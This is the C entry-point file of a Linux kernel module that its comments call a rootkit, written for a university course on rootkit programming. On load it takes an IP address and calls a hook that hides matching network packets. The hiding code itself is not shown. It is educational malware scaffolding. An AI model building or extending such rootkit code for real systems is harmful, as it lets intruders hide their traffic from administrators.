/*
 * Rootkit for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <linux/kernel.h>

#include "hide_packet.h"
#include "include.h"

/* module parameter  
 * To get the IP address, Input as string and parse it
 */

static char input_ip[16]; 
module_param_string(ipv4_address, input_ip, 16, 0);

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and then does its magic.
 */
int init_module (void)
{	
	ROOTKIT_DEBUG("Loading packet-hider LKM...\n");
	
	//TODO: optional: Check whether this is valid ip, since we have to check this inside anyways.

	/* ensure the input protocol is either 'tcp' or 'udp' */
	/*if(! (strcmp(tlp_version, "tcp") == 0 || strcmp(tlp_version, "udp") == 0) )
	{
		ROOTKIT_DEBUG("Please only use 'tcp' or 'udp' for the protocol version!\n");
		return -EINVAL;
	}*/
	
	hook_packets(input_ip);
	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the kernel to its
 * original form.
 */
void cleanup_module (void)
{
	unhook_packets();
	
	/* Finally, log the unloading */
	ROOTKIT_DEBUG("Unloading packet-hider... bye!\n");
}
